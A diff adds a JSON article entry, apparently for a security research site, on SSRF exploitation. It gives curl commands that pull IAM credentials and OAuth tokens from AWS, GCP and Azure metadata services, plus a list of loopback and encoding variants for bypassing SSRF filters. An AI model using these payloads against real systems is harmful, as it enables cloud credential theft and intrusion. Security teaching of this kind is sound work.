@@ -1,0 +1,45 @@
+{
+  "id": "research-ssrf-techniques",
+  "title": "Advanced SSRF Exploitation",
+  "slug": "advanced-ssrf",
+  "category": "research",
+  "tags": [
+    "SSRF",
+    "Cloud",
+    "AWS",
+    "Web Security"
+  ],
+  "difficulty": "Hard",
+  "date": "2024-09-15",
+  "summary": "Exploring advanced SSRF techniques including cloud metadata exploitation, protocol smuggling, and DNS rebinding.",
+  "content": [
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Cloud Metadata Endpoints"
+    },
+    {
+      "type": "paragraph",
+      "text": "Cloud providers expose metadata services that can leak sensitive credentials when accessed via SSRF."
+    },
+    {
+      "type": "code",
+      "language": "bash",
+      "code": "# AWS IMDSv1\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# GCP\ncurl -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\n\n# Azure\ncurl -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\""
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Bypass Techniques"
+    },
+    {
+      "type": "paragraph",
+      "text": "Various techniques to bypass SSRF filters and blocklists."
+    },
+    {
+      "type": "code",
+      "language": "text",
+      "code": "# IP address variations\nhttp://127.0.0.1\nhttp://127.1\nhttp://0x7f000001\nhttp://2130706433  # decimal\nhttp://[::1]  # IPv6\nhttp://localhost\nhttp://127.0.0.1.nip.io\n\n# URL encoding\nhttp://127.0.0.1/%2f%2e%2e\n\n# DNS rebinding\n# Use a domain that alternates between your IP and 127.0.0.1"
+    }
+  ]
+}
